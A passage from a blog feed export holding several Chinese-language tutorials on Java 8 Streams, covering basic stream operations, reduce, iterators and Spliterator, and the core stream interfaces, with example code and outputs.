System.out.println(&quot;stream9:&quot; + stream9.collect(joining()));&#125; catch (IOException e) &#123;    e.printStackTrace();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>data.txt文件内容如下：</p><pre class="line-numbers language-none"><code class="language-none">ABC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream9:ABC</p></blockquote><h2 id="10、Stream-generate"><a href="#10、Stream-generate" class="headerlink" title="10、Stream.generate"></a>10、Stream.generate</h2><pre class="line-numbers language-none"><code class="language-none">Stream&lt;String&gt; stream10 &#x3D; Stream.generate(() -&gt; &quot;A&quot;).limit(3);System.out.println(&quot;stream10:&quot; + stream10.collect(joining()));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>程序输出：</p><blockquote><p>stream10:AAA</p></blockquote><p>好了，这是栈长整理的 10 种创建 Stream 的方式，是不是很骚？如果你还知道其他的骚操作，可以留言告诉大家，让大家记住你的头像和ID。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 新特性之 Stream 流（一）基础体验</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80%E4%BD%93%E9%AA%8C/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E7%A1%80%E4%BD%93%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是流API-它能做一些什么"><a href="#什么是流API-它能做一些什么" class="headerlink" title="什么是流API? 它能做一些什么?"></a>什么是流API? 它能做一些什么?</h4><p>我们应该知道(绝对知道~)API是一个程序向使用者提供的一些方法，通过这些方法就能实现某些功能。所以对于流API来说，重点是怎么理解”流”这个概念，所谓的流:就是数据的渠道，所以，流代表的是一个对象的序列它和Java I&#x2F;O类里使用的”流”不同。虽然在概念上与java.util.stream中定义的流是类似的，但它们是不同的，流API中的流是描述某个流类型的对象。</p><p>流API中的流操作的数据源，是数组或者是集合。它本身是不存储数据的，只是移动数据，在移动过程中可能会对数据进行过滤，排序或者其它操作，但是，一般情况下(绝大数情况下)，流操作本身不会修改数据源，比如，对流排序不会修改数据源的顺序。相反，它会创建一个新的流，其中包含排序后的结果。</p><h4 id="从一个简单的例子，体验流API的强大与优雅"><a href="#从一个简单的例子，体验流API的强大与优雅" class="headerlink" title="从一个简单的例子，体验流API的强大与优雅"></a>从一个简单的例子，体验流API的强大与优雅</h4><p>这个简单的Demo，主要是对一个由1-6乱序组成的List对应的流进行操作，然后通过这个流，就可以获取到列表里面最大最小值、排序、过滤某些元素等等的操作。并且这此操作不会改变原List里面的数据。Demo里面需要注意的地方就是流API里面的”终端操作”和”中间操作”的区别:其实也很简单，终端操作会消费流，一个被消费过的流是不能被再次利用的，但我们在实际应用的时候，并不会受到太大的影响(Ps:如果你们能动手实践一下我相信你体验更好，强烈推荐！)</p><pre class="line-numbers language-none"><code class="language-none">public class Main &#123;    public static void main(String[] args) &#123;         learnStream();    &#125;    private static void learnStream() &#123;        &#x2F;&#x2F;首先，创建一个1-6乱序的List        List&lt;Integer&gt; lists &#x3D; new ArrayList&lt;&gt;();        lists.add(4);        lists.add(3);        lists.add(6);        lists.add(1);        lists.add(5);        lists.add(2);        &#x2F;&#x2F;看看List里面的数据是什么样子的先        System.out.print(&quot;List里面的数据:&quot;);        for (Integer elem : lists) System.out.print(elem + &quot; &quot;);&#x2F;&#x2F; 4 3 6 1 5 2        System.out.println();        &#x2F;&#x2F;最小值        System.out.print(&quot;List中最小的值为:&quot;);        Stream&lt;Integer&gt; stream &#x3D; lists.stream();        Optional&lt;Integer&gt; min &#x3D; stream.min(Integer::compareTo);        if (min.isPresent()) &#123;            System.out.println(min.get());&#x2F;&#x2F;1        &#125;        &#x2F;&#x2F;最大值        System.out.print(&quot;List中最大的值为:&quot;);        lists.stream().max(Integer::compareTo).ifPresent(System.out::println);&#x2F;&#x2F;6        &#x2F;&#x2F;排序        System.out.print(&quot;将List流进行排序:&quot;);        Stream&lt;Integer&gt; sorted &#x3D; lists.stream().sorted();        sorted.forEach(elem -&gt; System.out.print(elem + &quot; &quot;));&#x2F;&#x2F; 1 2 3 4 5 6        System.out.println();        &#x2F;&#x2F;过滤        System.out.print(&quot;过滤List流，只剩下那些大于3的元素:&quot;);        lists.stream()                .filter(elem -&gt; elem &gt; 3)                .forEach(elem -&gt; System.out.print(elem + &quot; &quot;));&#x2F;&#x2F; 4 5 6        System.out.println();        &#x2F;&#x2F;过滤        System.out.println(&quot;过滤List流，只剩下那些大于0并且小于4的元素:\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;begin&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);        lists.stream()                .filter(elem -&gt; elem &gt; 0)                .filter(elem -&gt; elem &lt; 4)                .sorted(Integer::compareTo)                .forEach(System.out::println);&#x2F;&#x2F; 1 2 3        System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;end&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);        &#x2F;&#x2F;经过了前面的这么多流操作，我们再来看看List里面的值有没有发生什么改变        System.out.print(&quot;原List里面的数据:&quot;);        for (Integer elem : lists) System.out.print(elem + &quot; &quot;);&#x2F;&#x2F; 4 3 6 1 5 2    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果刚才的Demo你认真读了，我相信你心里面多多少少都会产生一点点涟漪，没错，流API结合lambda表达式，就是这么优美!下面我详细介绍一下整个Demo，让大家更加清淅:</p><h3 id="最小值"><a href="#最小值" class="headerlink" title="最小值"></a>最小值</h3><pre class="line-numbers language-none"><code class="language-none"> &#x2F;&#x2F;最小值System.out.print(&quot;List中最小的值为:&quot;);Stream&lt;Integer&gt; stream &#x3D; lists.stream();Optional&lt;Integer&gt; min &#x3D; stream.min(Integer::compareTo);if (min.isPresent()) &#123;     System.out.println(min.get());&#x2F;&#x2F;1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先通过stream()方法获取List对应的流，如果你对Java8的集合框架有一定的了解，你应该知道stream()是由Collection接口提供的。然后就可以通过min()获取流中的最小值了，当然这个流中的最小值肯定也是List里面的最小值。min()方法接收一个Comparator类型的参数，这个比较器是用于比较流中的两个元素的。我们这里把Integer的compareTo()的引用传递给了min()。它返回的类型是Optional，Optional可谓是NullPointException的大杀器啊，感兴趣的同学，了解一下。然后判断最小值存不存在，如果存在，就通过Optional的get()读取出来。很简单有木有!</p><h4 id="最大值"><a href="#最大值" class="headerlink" title="最大值"></a>最大值</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;最大值System.out.print(&quot;List中最大的值为:&quot;);lists.stream().max(Integer::compareTo).ifPresent(System.out::println);&#x2F;&#x2F;6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>语法糖爽YY有木有，不过需要注意的一点，因为min()是一个终端操作，所以这个流是不可以再用了，因此我们需要通过stream()重新生成一个流，(但这其实并不影响我们的实际生产的:①方法功能单一原则②还有其它很多很强大的方法组合能让你实现各种功能啊.)ifPresent其实和上面的最小值的if判断是一定要，如果存在最大值，我们就打印一下，这里只不过用了一些函数式写法而已。</p><h4 id="排序和遍历"><a href="#排序和遍历" class="headerlink" title="排序和遍历"></a>排序和遍历</h4><pre class="line-numbers language-none"><code class="language-none"> &#x2F;&#x2F;排序System.out.print(&quot;将List流进行排序:&quot;);Stream&lt;Integer&gt; sorted &#x3D; lists.stream().sorted();sorted.forEach(elem -&gt; System.out.print(elem + &quot; &quot;));&#x2F;&#x2F; 1 2 3 4 5 6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>通过上面的讲解，相信这个已经难不了你了，sorted()方法是用于排序的，它的一个重载方法可以接收一个Comparator类型的参数，让你自定义你的排序规则。forEach方法就遍历。</p><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h4><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;过滤System.out.println(&quot;过滤List流，只剩下那些大于0并且小于4的元素:\n&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;begin&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);lists.stream()          .filter(elem -&gt; elem &gt; 0)          .filter(elem -&gt; elem &lt; 4)          .sorted(Integer::compareTo)          .forEach(System.out::println);&#x2F;&#x2F; 1 2 3System.out.println(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;end&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filter()是基于一个谓词过滤流，它返回一个只包含满足谓词的元素的新流。它的参数形式是Predicate&lt;? super T&gt;是在java.util.function包下的泛型函数式接口。并且filter是一个中间操作，而且还可以同时存在多个filter。这里的两个过滤器，我们都传递了lambda表达式。</p><h4 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h4><p>其实基本的流API使用就是这么简单，结合lambda表达式后，一切都变得特别清淅，这个简单的Demo展示了一些基础的功能，它或许就扩展了你操作数组或者集合框架的思路，让你操作集合和数组，变得更加的容易，简单和高效。当然流API的的功能肯定不止这一点点，我会陆陆续续完善整个系列，大家跟着我的步伐，就这一次，踏踏实实学好流式API，走向人生巅峰，迎娶白富美！</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 新特性之 Stream 流（七）流与迭代器，流系列大结局！</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%B8%83%EF%BC%89%E6%B5%81%E4%B8%8E%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%8C%E6%B5%81%E7%B3%BB%E5%88%97%E5%A4%A7%E7%BB%93%E5%B1%80%EF%BC%81/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%B8%83%EF%BC%89%E6%B5%81%E4%B8%8E%E8%BF%AD%E4%BB%A3%E5%99%A8%EF%BC%8C%E6%B5%81%E7%B3%BB%E5%88%97%E5%A4%A7%E7%BB%93%E5%B1%80%EF%BC%81/</url>
      
        <content type="html"><![CDATA[<p>恭喜你们，马上就要学完Java8 Stream流的一整系列了，其实我相信Stream流对很多使用Java的同学来说，都是一个知识盲点，因为这个原因，我才这么细致地讲解Stream流的各个知识点，通过这一整个系列，我相信只要认真看了的同学，都已掌握的差不多了，就差实战了。</p><p>其实我在工作过程中，Stream流对我的帮助真的挺大的，所以，我想和大家分享一下，于是这系列的文章就出来了。</p><p>在本系列文章发布的时候，有很多同学反映，Stream流的调试和forEach()的调试都不是特别友好，那本篇给出一个折中的调试方法，虽然不能完美解决调试的问题，但是基本上已经能解决绝大部分的调试问题了，没错，就是迭代器了，当然迭代器除了能辅助调试以外，他最重要的还是遍历功能。</p><p>这篇文章除了介绍传统的迭代器外，还会介绍Java8中新增的Spliterator，因为在并行流的场合，Spliterator相当的好用。</p><h4 id="我们先简单介绍一下传统的迭代器"><a href="#我们先简单介绍一下传统的迭代器" class="headerlink" title="我们先简单介绍一下传统的迭代器"></a>我们先简单介绍一下传统的迭代器</h4><p>迭代器是实现了Iterator接口的对象，并且Iterator接口允许遍历，获取或者移除元素。</p><pre class="line-numbers language-none"><code class="language-none">public interface Iterator&lt;E&gt; &#123;  Iterator&lt;T&gt; iterator();  E next();  default void remove() &#123;        throw new UnsupportedOperationException(&quot;remove&quot;);  &#125;  default void forEachRemaining(Consumer&lt;? super E&gt; action) &#123;        Objects.requireNonNull(action);        while (hasNext())            action.accept(next());  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用Iterator的一般步骤：</p><ul><li><p>(1)通过iterator()方法，获取指向集合或流开头的迭代器。</p></li><li><p>(2)建立一个hasNext()方法调用循环，只要hasNext()返回true,就继续迭代。</p></li><li><p>(3)在循环中，通过调用next()方法获取每个元素。</p></li></ul><pre class="line-numbers language-none"><code class="language-none">private static void learnIterator() &#123;    List&lt;String&gt; lists &#x3D; Arrays.asList(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;);    Iterator&lt;String&gt; iterator &#x3D; lists.stream().iterator();    while (iterator.hasNext()) &#123;        System.out.println(iterator.next());    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是如果我们不修改集合的情况下，使用forEach()其实更加便利的，其实两种方式本质上面是一样的，在你编译之后，forEach()会转换成迭代器的方式进行操作了。有了迭代器，相信调试就得方便起来了，即使不能直接调试，也可以通过迭代器，反推之前，可能发生了什么。</p><p>值得注意的一点是：Java8给基本类型的流提供了额外的迭代器：PrimitiveIterator.OfInt,PrimitiveIterator.OfDouble,PrimitiveIterator.OfLong,PrimitiveIterator,但这些接口都是来扩展自Iterator接口的，所以使用上面也是相同的。</p><h4 id="Spliterator"><a href="#Spliterator" class="headerlink" title="Spliterator"></a>Spliterator</h4><p>Spliterator是Java8新增的一种迭代器，这种迭代器由<code>Spliterator</code>接口定义，Spliterator也有普通的遍历元素功能，这一点与刚才说的迭代器类似的，但是，但是Spliterator方法和使用迭代器的方法是不同的。</p><p>另外，它提供的功能要比Iterator多。最终要的一点，Spliterator支持并行迭代。</p><pre class="line-numbers language-none"><code class="language-none">public interface Spliterator&lt;T&gt; &#123;    boolean tryAdvance(Consumer&lt;? super T&gt; action);    int characteristics();    long estimateSize();   Spliterator&lt;T&gt; trySplit();   default void forEachRemaining(Consumer&lt;? super T&gt; action) &#123;        do &#123; &#125; while (tryAdvance(action));   &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将Spliterator用于基本迭代任务是非常简单的，只需要调用tryAdvance()方法，直至其返回false.如果要为序列中的每个元素应用相同的动作，那么forEachRemaining()提供了一种更加高效的替代方法。</p><p>对于这两个方法，在每次迭代中将发生的动作都由<code>Consumer</code>对象定义的操作来决定，<code>Consumer</code>也是一个函数式接口，估计大家已经知道怎么分析了，这里就不带大家分析了，他的动作是指定了在迭代中下一个元素上执行的操作。下面来一个简单的例子：</p><pre class="line-numbers language-none"><code class="language-none">private static void learnIterator() &#123;    List&lt;String&gt; lists &#x3D; Arrays.asList(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;);    Spliterator&lt;String&gt; spliterator &#x3D; lists.stream().spliterator();    while (spliterator.tryAdvance(System.out::println));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用forEachRemaining()方法改进这个例子：</p><pre class="line-numbers language-none"><code class="language-none">private static void learnIterator() &#123;    List&lt;String&gt; lists &#x3D; Arrays.asList(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;);    lists.stream().spliterator().forEachRemaining(System.out::println);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注意，使用这个方法时，不需要提供一个循环来一次处理一个元素，而是将各个元素作为一个整体来对待，这是Spliterator的又一个优势。</p><p>Spliterator的另一个值得注意的方法是trySplit()，它将被迭代的元素划分成了两部分，返回其中一部分的新Spliterator,另一部分则通过原来的Spliterator访问。下面再给一个简单的例子</p><pre class="line-numbers language-none"><code class="language-none">private static void learnIterator() &#123;    List&lt;String&gt; lists &#x3D; Arrays.asList(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;, &quot;D&quot;);    Spliterator&lt;String&gt; spliterator &#x3D; lists.stream().spliterator();    Spliterator&lt;String&gt; stringSpliterator &#x3D; spliterator.trySplit();    if (stringSpliterator !&#x3D; null) stringSpliterator.forEachRemaining(System.out::println);    System.out.println(&quot;------------------&quot;);    spliterator.forEachRemaining(System.out::println);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打印的结果：</p><pre class="line-numbers language-none"><code class="language-none">AB------------------CD<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里只是给大家提供了这种方式而已，例子本身没有什么含义，但是当你对大数据集执行并行处理时，拆分可能是极有帮助的了。但更多情况下，要对流执行并行操作时，使用其他某个Stream方法更好，而不必手动处理Spliterator的这些细节，Spliterator最适合的场景是，给定的所有方法都不能满足你的要求时，才考虑。</p><h4 id="最后来一个总结"><a href="#最后来一个总结" class="headerlink" title="最后来一个总结"></a>最后来一个总结</h4><p>到这里，Java8 Stream流的知识，基本上已经介绍完了，缩减操作，并行流，映射，还有收集是Stream流的核心内容，但是要想掌握好这些内容，第二篇的基本知识你是跑不掉的，因此我的建议还是老老实实，从第一篇开始认真看，看完这7篇文章，你基本已经非常系统地掌握Java8的Stream流知识了。</p><p>大家也不要忘记<code>Collectors</code>类，里面提供给我们的方法，基本上能处理各种各样的收集元素问题了，如果你从第一篇文章开始看，一直看到这里了，那你以后尽量多使用Stream流来处理集合吧，只是学会这些知识是没有用的，要多在你们的项目中运用他们，这样才能更加好地理解，如果大家在使有的过程中遇到什么样的问题，欢迎来这里面留言，我看到了，一定第一时间和大家一起探索解决的方法。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 新特性之 Stream 流（三）缩减操作</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%B8%89%EF%BC%89%E7%BC%A9%E5%87%8F%E6%93%8D%E4%BD%9C/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%B8%89%EF%BC%89%E7%BC%A9%E5%87%8F%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>和前面两篇文章一起服用，效果会更佳。通过对流API的基础体验Demo和关键知识点的讲解，相信大家对流API都有一定的认识了，但是流API强大的功能，可不仅仅像前面两篇文章中说的那样简单，大家应该注意到，在第二篇中，我对Stream接口进行介绍的时候，并没有把他的全部方法都进行了解析说明。没错，从这一篇开始，那些还没有讲解的方法，很可能就开始变成我们的主角了，大家从题目上面应该知道了，本期我们要讲的是流API的缩减操作。</p><h4 id="何为缩减操作？"><a href="#何为缩减操作？" class="headerlink" title="何为缩减操作？"></a>何为缩减操作？</h4><p>我们先考虑一下min()和max()，这两个方法我们在第一篇和第二篇中均有提到，其中min()是返回流中的最小值，而max()返回流中最大值，前提是他们存在。他们之间的特点是什么？①都返回了一个值②由一可知，他们是终端操作。如果我们用流API的术语来形容前面这两种特性的结合体的话，它们代表了缩减操作。因为每个缩减操作都把一个流缩减为一个值，好比最大值，最小值。当然流API，把min()和max()，count()这些操作称为特例缩减。即然说到了特例，肯定就有泛化这种概念了，他就是reduce()方法了，其实第二篇当中，他已经出现过了，只是当时我没有去强调他。</p><pre class="line-numbers language-none"><code class="language-none">public interface Stream&lt;T&gt; extends BaseStream&lt;T, Stream&lt;T&gt;&gt; &#123;&#x2F;&#x2F;、、、忽略其他无关紧要的元素T reduce(T identity, BinaryOperator&lt;T&gt; accumulator);Optional&lt;T&gt; reduce(BinaryOperator&lt;T&gt; accumulator);&lt;U&gt; U reduce(U identity,          BiFunction&lt;U, ? super T, U&gt; accumulator,          BinaryOperator&lt;U&gt; combiner);｝<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Stream接口定义了三个版本的reduce()，我们先使用前面两个,</p><pre class="line-numbers language-none"><code class="language-none">T reduce(T identity, BinaryOperator&lt;T&gt; accumulator);&#x2F;&#x2F;1Optional&lt;T&gt; reduce(BinaryOperator&lt;T&gt; accumulator);&#x2F;&#x2F;2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一个版本返回的是一个T类型的对象，T代表的是流中的元素类型！第二个版本是返回一个Optional类型对象。对于这两种形式，accumulator是一个操作两个值并得到结果的函数。在第一个版本当中，identity是这样一个值，对于涉及identity和流中任意的累积操作，得到的结果就是元素自身，没有任何改变。比如，如果是加法，他就是0，如果是乘法他就是1。</p><p>其中的accumulator是一个BinaryOperator<T>的类型，他是java.util.function包中声明的函数式接口，它扩展了BiFunction函数式接口.</p><pre class="line-numbers language-none"><code class="language-none">@FunctionalInterfacepublic interface BinaryOperator&lt;T&gt; extends BiFunction&lt;T,T,T&gt; &#123;&#125;@FunctionalInterfacepublic interface BiFunction&lt;T, U, R&gt; &#123;   R apply(T t, U u);&#x2F;&#x2F;notice&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>BiFunction接口中的apply()方法的原型在*<code>//notice</code>*。其中R指定了结果的类型，T，U分别是第一参数的类型和第二个参数的类型，因此apply()对他的两个操作数(t,u)应用到同一个函数上，并返回结果，而对BinaryOperator<T>来说，他在扩展 BiFunction时，指定了所有的类型参数都是相同的T，因此对于BinaryOperator<T>函数式接口的apply来说，他也就变成了  T apply(T t, T u),此外，还有一个需要注意的地方是，在应用reduce()时，apply()的第一个参数t,包含的是一个结果，u包含的是下一个元素。在第一次调用时，将取决于使用reduce()的版本，t可能是单位值，或者是前一个元素。</p><h4 id="缩减操作的三个约束"><a href="#缩减操作的三个约束" class="headerlink" title="缩减操作的三个约束"></a>缩减操作的三个约束</h4><ul><li><strong>无状态</strong></li><li><strong>不干预</strong></li><li><strong>关联性</strong></li></ul><p>无状态，这里可不是LOL的那个无状态，毕竟他退役了。相信读过第二篇文章的同学已经很容易理解了，简单来说无状态就是每个元素都被单独地处理，他和流中的其它元素是没有任何依赖关系的。不干预是指操作数不会改变数据源。最后，操作必须具有关联性，这里的关联性是指标准的数学含义，即，给定一个关联运算符，在一系列操作中使用该运算符，先处理哪一对操作数是无关紧要的。比如，(1 * 2) * 3  &lt;&#x3D;&#x3D;&#x3D;&gt; 1 * (2 * 3)。<code>其中关联性，在并行流中，是至关重要的。</code>下面我用一个简单的例子带着大家实战一下泛化缩减操作reduce()的使用。</p><pre class="line-numbers language-none"><code class="language-none">public class Main &#123;    public static void main(String[] args) &#123;        learnStream();    &#125;    private static void learnStream() &#123;        List&lt;Integer&gt; lists &#x3D; new ArrayList&lt;&gt;();        lists.add(1);        lists.add(2);        lists.add(3);        lists.add(4);        lists.add(5);        lists.add(6);        Optional&lt;Integer&gt; sum &#x3D; lists.stream().reduce((a, b) -&gt; a + b);        if (sum.isPresent()) System.out.println(&quot;list的总和为:&quot; + sum.get());&#x2F;&#x2F;21        &#x2F;&#x2F;&lt;&#x3D;&#x3D;&#x3D;&#x3D;&gt; lists.stream().reduce((a, b) -&gt; a + b).ifPresent(System.out::println);        Integer sum2 &#x3D; lists.stream().reduce(0, (a, b) -&gt; a + b);&#x2F;&#x2F;21        System.out.println(&quot;list的总和为:&quot; + sum2);        Optional&lt;Integer&gt; product &#x3D; lists.stream().reduce((a, b) -&gt; a * b);        if (product.isPresent()) System.out.println(&quot;list的积为:&quot; + product.get());&#x2F;&#x2F;720        Integer product2 &#x3D; lists.stream().reduce(1, (a, b) -&gt; a * b);        System.out.println(&quot;list的积为:&quot; + product2);&#x2F;&#x2F;720    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个Demo主要是计算了一个list里面的总和，积的操作，大家可以和传统的算总和，积的方法进行对照，比一比衡量一下就有自己的答案了。但是如果你以为流API仅此而已，那你就错了。越是后面的东西，就越装B，我在刚知道他们的时候，反正是被吓了一跳的，但这些都是后话了，现在我们来详解一下Demo,并给出扩展的方向：我们这个例子主要是用了lambda表达式对list进行了求和，求积，对于第一个版本为说，求和的时候，identity的值为0，求积的时候它的值为1，强烈建议你们自己感受一下identity的变化对整个结果的变化产生什么 的影响，改变一下identity的值，再运行一下，你就有结果了，另一个扩展点是：</p><pre class="line-numbers language-none"><code class="language-none">Integer product3 &#x3D; lists.stream().reduce(1, (a, b) -&gt; &#123;           if (b % 2 &#x3D;&#x3D; 0) return a * b; else return a;&#x2F;&#x2F;这里你可以为所欲为!&#125;);System.out.println(&quot;list的偶数的积为:&quot; + product3);&#x2F;&#x2F;48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h4><p>对于流的缩减操作来说,主要要知道,他只返回一个值,并且它是一个终端操作,然后还有的就是要知道缩减操作的三个约束了,其实最重要的就是无状态性和关联性了.这一小节要说的,也就这么多了,应该很容易就把他收到自己的技能树上面了。</p>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 8 新特性之 Stream 流（二）关键知识点</title>
      <link href="/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%BA%8C%EF%BC%89%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
      <url>/2025/10/15/%E6%96%B0%E7%89%B9%E6%80%A7/Java8/Stream/Java%208%20%E6%96%B0%E7%89%B9%E6%80%A7%E4%B9%8B%20Stream%20%E6%B5%81%EF%BC%88%E4%BA%8C%EF%BC%89%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<p>我们的第一篇文章，主要是通过一个Demo，让大家体验了一下使用流API的那种酣畅淋漓的感觉。如果你没有实践，我还是再次呼吁你动手敲一敲，自己实实在跑一遍上一篇的Demo。相信你的感受和理解也会随之加深的。继续探索流API的高级功能之前，我们先从接口级别全面了解一下流API，这个对于我们来说是至关重要的。接下来，我给大家准备了一张流API关键知识点的UML图。但是大家只需要花一两分钟，整理看一下就可以了，不需要记住，先有个印象，后面我给大家讲解一些关键的方法:</p><h4 id="流API-UML"><a href="#流API-UML" class="headerlink" title="流API UML"></a>流API UML</h4><p><img src="https://upload-images.jianshu.io/upload_images/1640787-129cbee787eef3b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="流API UML"></p><p>我先整体介绍一下:流API定义的几个接口，都是在java.util.stream包中的.其中上图中的BaseStream接口是最基础的接口，它提供了所有流都可以使用的基本功能:</p><pre class="line-numbers language-none"><code class="language-none">public interface BaseStream&lt;T, S extends BaseStream&lt;T, S&gt;&gt; extends AutoCloseable &#123;&#x2F;&#x2F;....先忽略这些具体的细节&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>由这个接口的定义我们得知，BaseStream是一个泛型接口,它有两个类型参数T和S， 其中T指定了流中的元素的类型,并且由&lt;S extends BaseStream&lt;T, S&gt;&gt;可以知道S必须为BaseStream或BaseStream子类(换句话说,就是S必须是扩展自BaseStream的)。BaseStream继承了AutoCloseable接口。这个接口主要是简化了关闭资源的操作。但是像平时我们操作的集合或数组，基本上都不会出现关闭流的情况。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;由BaseStream接口派生出的流接口包括IntStream ，LongStream，DoubleStream ，Stream&lt;T&gt;public interface IntStream extends BaseStream&lt;Integer, IntStream&gt; &#123;&#125;public interface 